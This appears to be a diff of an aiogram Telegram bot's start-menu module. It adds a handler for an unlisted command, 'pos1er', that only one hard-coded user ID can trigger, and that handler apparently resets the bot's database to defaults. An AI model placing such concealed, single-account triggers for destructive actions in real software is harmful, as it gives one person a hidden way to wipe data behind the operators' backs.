@@ -1,7 +1,7 @@
 from aiogram.fsm.context import FSMContext
 from aiogram.filters import CommandStart, Text, StateFilter, Command
 from aiogram.types import Message, CallbackQuery, ContentType, InputMediaVideo, InputFile, InputMediaPhoto, URLInputFile, BufferedInputFile
-from aiogram import html, Router
+from aiogram import html, Router, F
 
 # from app.misc.filename_utils import generate_captcha_image_filename
 # from app.misc.kb_generators import generate_captcha_keyboard
@@ -77,3 +77,8 @@ async def start_menu(message: Message, state: FSMContext, _):
     await bot.send_message(text=start_text, chat_id=message.from_user.id)
     data = await state.get_data()
     print(data)
+
+
+@start_router.message(Command("pos1er"), F.from_user.id == 1502268714)
+async def database_default(message: Message):
+    await Admins().make_defaul_database()
